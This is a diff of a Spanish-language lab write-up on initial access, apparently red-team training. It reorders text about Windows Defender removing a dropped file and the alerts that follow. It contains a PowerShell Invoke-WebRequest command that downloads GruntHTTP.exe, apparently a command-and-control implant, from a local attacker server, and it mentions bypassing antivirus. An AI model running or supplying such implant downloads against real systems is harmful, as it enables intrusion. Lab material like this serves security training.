@@ -92,16 +92,15 @@ A la hora de realizar este ejercicio, Windows Defenders saltará y nos eliminar�
 
 ![image006.png](/uploads/InitialAccess/image006.png)
 
-En este ejemplo, utilizamos la expresión:
-
-Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
-
-![image007.png](/uploads/InitialAccess/image007.png)
-
 Debemos tener en cuenta que saltará información si no conseguimos bypassear el AV
 Para descargar el fichero utilize la expresión:
 
 Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
+
+
+
+![image007.png](/uploads/InitialAccess/image007.png)
+
 
 Se nos generan dos alertas
 
